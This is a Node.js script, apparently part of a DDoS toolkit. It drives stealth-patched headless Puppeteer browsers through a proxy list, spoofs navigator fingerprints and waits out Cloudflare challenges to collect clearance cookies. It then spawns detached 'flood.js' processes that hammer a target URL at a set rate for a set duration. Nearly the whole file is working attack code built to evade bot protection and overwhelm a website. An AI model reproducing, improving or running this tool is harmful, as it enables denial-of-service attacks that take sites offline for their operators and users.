const fs = require("fs");
const { spawn } = require("child_process");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin
puppeteer.use(StealthPlugin());

// Configuration
const MAX_RETRIES = 2;
const TIMEOUT = 30000; // 30 seconds

// Colors for logging
const colors = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  pink: "\x1b[35m",
};

function log(type, message) {
  const prefix = `${colors.cyan}[m85|Browser]${colors.reset}`;
  let color = colors.reset;
  let symbol = "ℒ";
  
  if (type === "error") { color = colors.red; symbol = "×"; }
  if (type === "success") { color = colors.green; symbol = "✓"; }
  if (type === "warn") { color = colors.yellow; symbol = "!"; }
  if (type === "info") { color = colors.cyan; symbol = "ℒ"; }
  if (type === "pink") { color = colors.pink; symbol = "★"; }
  
  console.log(`${prefix} ${color}${symbol} ${message}${colors.reset}`);
}

// Check command line arguments
if (process.argv.length < 7) {
  log("error", "Usage: node browser.js <url> <threads> <proxies.txt> <rate> <duration_seconds>");
  log("error", "Example: node browser.js https://example.com 5 proxies.txt 100 60");
  process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
let proxies = [];
try {
  const data = fs.readFileSync(proxyFile, 'utf8');
  proxies = data.trim().split(/\r?\n/).filter(p => p.trim());
  log("success", `Loaded ${proxies.length} proxies`);
} catch (error) {
  log("error", `Cannot read proxy file: ${error.message}`);
  process.exit(1);
}

if (proxies.length === 0) {
  log("error", "No proxies found in file");
  process.exit(1);
}

// Random user agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
];

function getRandomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Spoof fingerprint to avoid detection
async function spoofFingerprint(page) {
  await page.evaluateOnNewDocument(() => {
    // Override webdriver
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    
    // Override plugins
    Object.defineProperty(navigator, 'plugins', {
      get: () => [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Native Client', filename: 'internal-nacl-plugin' }
      ]
    });
    
    // Override languages
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    
    // Override hardware concurrency
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
    
    // Override device memory
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
    
    // Override permissions
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications' ?
        Promise.resolve({ state: Notification.permission }) :
        originalQuery(parameters)
    );
  });
}

// Main browser function
async function openBrowser(proxy, id) {
  const userAgent = getRandomUA();
  const tempDir = `./temp_profile_${id}_${Date.now()}`;
  
  // Ensure proxy has http:// prefix
  let proxyUrl = proxy;
  if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
    proxyUrl = `http://${proxyUrl}`;
  }
  
  const options = {
    headless: "new",
    ignoreHTTPSErrors: true,
    userDataDir: tempDir,
    args: [
      `--proxy-server=${proxyUrl}`,
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-accelerated-2d-canvas',
      '--disable-gpu',
      '--disable-browser-side-navigation',
      '--disable-features=IsolateOrigins,site-per-process',
      `--user-agent=${userAgent}`
    ]
  };
  
  let browser = null;
  
  try {
    log("info", `[${id}] Launching with proxy: ${proxy}`);
    
    browser = await puppeteer.launch(options);
    const pages = await browser.pages();
    const page = pages[0];
    
    // Apply fingerprint spoofing
    await spoofFingerprint(page);
    
    // Set timeouts
    page.setDefaultTimeout(TIMEOUT);
    page.setDefaultNavigationTimeout(TIMEOUT);
    
    // Add random delay to avoid detection
    await sleep(Math.random() * 2000 + 1000);
    
    log("info", `[${id}] Navigating to ${targetURL}`);
    
    // Try to navigate
    await page.goto(targetURL, {
      waitUntil: 'domcontentloaded',
      timeout: TIMEOUT
    });
    
    // Check for Cloudflare challenge
    const pageContent = await page.content();
    if (pageContent.includes("challenge-platform") || pageContent.includes("cf-browser-verification")) {
      log("pink", `[${id}] Cloudflare challenge detected - attempting bypass`);
      await sleep(8000); // Wait for potential auto-bypass
    }
    
    // Get page info
    const title = await page.title();
    const currentUrl = page.url();
    
    log("success", `[${id}] Loaded: ${title} (${currentUrl})`);
    
    // Get cookies
    const cookies = await page.cookies();
    const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
    
    // Check if blocked
    if (title.includes("Just a moment") || title.includes("Attention Required")) {
      log("warn", `[${id}] Cloudflare block detected, proxy may be flagged`);
      await browser.close();
      
      // Cleanup temp directory
      try {
        fs.rmSync(tempDir, { recursive: true, force: true });
      } catch(e) {}
      
      return {
        success: false,
        proxy: proxy,
        error: "Cloudflare block detected",
        blocked: true
      };
    }
    
    // Success! Now spawn flood.js
    log("success", `[${id}] ✅ Starting flood.js with proxy: ${proxy}`);
    
    // Prepare arguments for flood.js
    const floodArgs = [
      "flood.js",
      targetURL,
      "100",        // connections
      "2",          // threads per flood
      proxy,        // proxy
      rates,        // rate
      cookieString, // cookies
      userAgent     // user agent
    ];
    
    log("info", `[${id}] Spawning: node ${floodArgs.join(' ')}`);
    
    // Spawn flood.js process
    const floodProcess = spawn("node", floodArgs, {
      detached: true,
      stdio: 'ignore'
    });
    
    // Detach the process so it continues even if browser closes
    floodProcess.unref();
    
    log("success", `[${id}] flood.js started with PID: ${floodProcess.pid}`);
    
    // Close browser
    await browser.close();
    
    // Cleanup temp directory
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch(e) {}
    
    return {
      success: true,
      proxy: proxy,
      title: title,
      cookies: cookieString,
      userAgent: userAgent,
      pid: floodProcess.pid
    };
    
  } catch (error) {
    log("error", `[${id}] Failed: ${error.message}`);
    
    if (browser) {
      try { await browser.close(); } catch(e) {}
    }
    
    // Cleanup temp directory
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch(e) {}
    
    return {
      success: false,
      proxy: proxy,
      error: error.message
    };
  }
}

// Thread worker with retry
async function worker(proxy, id, retries = 0) {
  const result = await openBrowser(proxy, id);
  
  if (!result.success && retries < MAX_RETRIES) {
    log("warn", `[${id}] Retry ${retries + 1}/${MAX_RETRIES} for ${proxy}`);
    await sleep(3000);
    return worker(proxy, id, retries + 1);
  }
  
  return result;
}

// Kill all flood.js processes on exit
function cleanup() {
  log("warn", "Cleaning up flood.js processes...");
  
  if (process.platform === 'win32') {
    const { exec } = require('child_process');
    exec('taskkill /F /IM node.exe /FI "WINDOWTITLE eq flood.js"', (err) => {
      if (err && err.code !== 1) {
        log("error", `Error killing flood.js: ${err.message}`);
      }
    });
  } else {
    const { exec } = require('child_process');
    exec('pkill -f flood.js', (err) => {
      if (err && err.code !== 1) {
        log("error", `Error killing flood.js: ${err.message}`);
      }
    });
    exec('pkill -f chrome', (err) => {
      if (err && err.code !== 1) {
        log("error", `Error killing chrome: ${err.message}`);
      }
    });
  }
}

// Main function
async function main() {
  log("info", `Target: ${targetURL}`);
  log("info", `Threads: ${threads}`);
  log("info", `Rate: ${rates}`);
  log("info", `Duration: ${duration} seconds`);
  log("info", `Total proxies: ${proxies.length}`);
  
  // Check if flood.js exists
  if (!fs.existsSync("flood.js")) {
    log("error", "flood.js not found in current directory!");
    log("error", "Make sure flood.js exists before running this script");
    process.exit(1);
  }
  
  // Create a queue of proxies
  const proxyQueue = [...proxies];
  let activeThreads = 0;
  let completed = 0;
  let successCount = 0;
  let failCount = 0;
  let blockedCount = 0;
  const spawnedProcesses = [];
  
  // Process function
  async function processProxy(proxy, id) {
    activeThreads++;
    const result = await worker(proxy, id);
    activeThreads--;
    completed++;
    
    if (result.success) {
      successCount++;
      if (result.pid) spawnedProcesses.push(result.pid);
      log("success", `[${id}] ✅ SUCCESS - Proxy: ${proxy} | flood.js PID: ${result.pid}`);
    } else if (result.blocked) {
      blockedCount++;
      log("error", `[${id}] 🚫 BLOCKED - Proxy: ${proxy} (Cloudflare)`);
    } else {
      failCount++;
      log("error", `[${id}] ❌ FAILED - Proxy: ${proxy} | Error: ${result.error}`);
    }
    
    // Log progress
    if (completed % 10 === 0 || completed === proxies.length) {
      log("info", `Progress: ${completed}/${proxies.length} | Success: ${successCount} | Blocked: ${blockedCount} | Failed: ${failCount}`);
    }
    
    // Process next proxy if available
    if (proxyQueue.length > 0) {
      const nextProxy = proxyQueue.shift();
      if (nextProxy) {
        processProxy(nextProxy, id + threads);
      }
    }
  }
  
  // Set up cleanup on exit
  process.on('SIGINT', () => {
    log("warn", "Interrupt received, cleaning up...");
    cleanup();
    setTimeout(() => process.exit(0), 2000);
  });
  
  // Start initial threads
  const startTime = Date.now();
  for (let i = 0; i < Math.min(threads, proxyQueue.length); i++) {
    const proxy = proxyQueue.shift();
    processProxy(proxy, i + 1);
  }
  
  // Wait for duration
  log("info", `Running for ${duration} seconds...`);
  await sleep(duration * 1000);
  
  // Stop and cleanup
  log("warn", "Time limit reached, stopping...");
  cleanup();
  
  // Final statistics
  await sleep(2000);
  
  log("success", `\n${colors.green}=== FINAL RESULTS ===${colors.reset}`);
  log("success", `Total tested: ${completed}`);
  log("success", `Successful (flood.js spawned): ${successCount}`);
  log("error", `Blocked by Cloudflare: ${blockedCount}`);
  log("error", `Failed (other errors): ${failCount}`);
  log("success", `Success rate: ${((successCount / completed) * 100).toFixed(2)}%`);
  
  process.exit(0);
}

// Run main function
main().catch(error => {
  log("error", `Fatal error: ${error.message}`);
  process.exit(1);
});
